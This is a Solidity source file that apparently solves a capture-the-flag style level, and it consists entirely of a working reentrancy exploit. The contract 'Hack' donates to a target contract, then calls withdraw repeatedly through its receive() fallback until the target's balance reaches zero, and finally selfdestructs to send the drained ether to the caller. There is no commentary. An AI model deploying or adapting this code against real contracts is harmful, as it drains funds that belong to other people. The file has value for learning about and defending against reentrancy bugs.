//SPDX-License-Identifier: MIT
pragma solidity^0.8.13;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Hack{
    IReentrancy private immutable contractAddress;

    constructor(address _contractAddress){
        contractAddress = IReentrancy(_contractAddress);
    }

    function attack() external payable {
        contractAddress.donate{value: 1e18}(address(this));
        contractAddress.withdraw(1e18);

        require(address(contractAddress).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amount = min(1e18, address(contractAddress).balance);
        if(amount > 0){
            contractAddress.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns(uint256){
        return x <= y ? x : y;
    }
}